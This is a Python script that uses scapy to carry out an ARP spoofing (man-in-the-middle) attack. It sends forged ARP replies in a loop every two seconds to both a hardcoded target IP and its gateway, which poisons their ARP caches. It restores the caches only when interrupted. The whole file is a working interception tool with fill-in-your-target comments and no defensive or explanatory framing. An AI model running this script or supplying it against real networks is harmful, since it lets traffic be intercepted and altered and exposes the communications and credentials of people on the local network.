import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc if answered_list else None


def spoof(target_ip, spoof_ip):
    try:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip),
                           psrc=spoof_ip)
        scapy.send(packet, verbose=False)
    except Exception as e:
        print(e)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


target_ip = "172.16.12.186"  # Enter your target IP
gateway_ip = "172.16.255.254"  # Enter your gateway's IP


def main():
    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count = sent_packets_count + 2
            time.sleep(2)
            #print("\r[*] Packets Sent " + str(sent_packets_count), end="")

    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        print("[+] Arp Spoof Stopped")


if __name__ == '__main__':
    main()